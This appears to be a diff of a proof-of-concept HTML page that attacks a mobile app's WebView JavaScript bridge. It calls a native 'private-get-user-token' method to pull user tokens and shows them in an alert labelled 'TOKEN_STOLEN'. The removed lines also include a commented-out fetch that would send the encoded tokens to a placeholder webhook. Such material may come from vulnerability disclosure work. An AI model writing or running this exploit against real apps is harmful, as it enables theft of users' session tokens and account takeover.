@@ -1,17 +1,11 @@
-<!DOCTYPE html>
-<html>
-<body>
-    <script>
-        // Use the bridge name found in BIDSWebViewActivity
-        if (window.setTGInfo && window.setTGInfo.callNative) {
-            window.setTGInfo.callNative('private-get-user-token', {"type":"all"}, function(res) {
-                alert("P1 Confirmed: " + JSON.stringify(res));
-                // Send to your remote listener if needed
-                // fetch('https://your-webhook.com/?data=' + btoa(JSON.stringify(res)));
-            });
-        } else {
-            document.write("Bridge 'setTGInfo' not detected.");
-        }
-    <\/script>
-</body>
-</html>
+<script>
+    // Calling the bridge found in BIDSWebViewActivity
+    try {
+        window.setTGInfo.callNative('private-get-user-token', {"scope":"all"}, (res) => {
+            // This will display the stolen token on the phone screen
+            alert("TOKEN_STOLEN: " + JSON.stringify(res));
+        });
+    } catch(e) {
+        document.write("Bridge error: " + e);
+    }
+</script>
